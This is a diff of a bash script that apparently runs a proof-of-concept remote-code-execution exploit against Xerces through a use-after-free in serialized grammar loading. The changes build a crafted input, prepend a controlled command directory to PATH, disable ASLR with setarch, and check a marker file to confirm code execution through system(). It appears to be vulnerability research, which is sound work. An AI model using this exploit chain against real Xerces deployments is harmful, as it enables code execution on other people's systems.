@@ -5,24 +5,39 @@ set -euo pipefail
 
 export LD_LIBRARY_PATH="$XERCES_BUILD/src${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
 
-rm -f /tmp/xerces_serialized_rce_proof
-rm -f uaf3_grammar.bin final_input.bin
+command_dir=/tmp/xerces-path
+marker=/tmp/xerces_serialized_rce_proof
+final_input=/tmp/xerces_final_input.bin
+
+rm -f "$marker"
+rm -f uaf3_grammar.bin final_input.bin "$final_input"
+rm -rf "$command_dir"
+mkdir -p "$command_dir"
 
 ./gen_uaf3 >/dev/null
-./build_final_input.py uaf3_grammar.bin ./poc_xerces_rce final_input.bin >/dev/null
 
+# build the final input offline; the final run has no in-process helper
+./build_final_input.py \
+  uaf3_grammar.bin \
+  ./poc_xerces_rce \
+  "$final_input" \
+  --command-dir "$command_dir" \
+  --marker "$marker"
+
+# clear the builder self-test marker, then run the plain loader with the same input path
+rm -f "$marker"
 set +e
-./poc_xerces_rce final_input.bin trigger.xml
+PATH="$command_dir:$PATH" setarch "$(uname -m)" -R ./poc_xerces_rce "$final_input"
 rc=$?
 set -e
 
-proof=$(cat /tmp/xerces_serialized_rce_proof 2>/dev/null || true)
+proof=$(cat "$marker" 2>/dev/null || true)
 
 echo "rc=$rc"
 echo "proof=$proof"
 
-if [[ "$rc" == "42" && "$proof" == "xerces-serialized-rce" ]]; then
-  echo '[+] code execution proof hit'
+if [[ "$proof" == "xerces-stock-system-rce" ]]; then
+  echo '[+] code execution proof hit through system()'
   exit 0
 fi
 
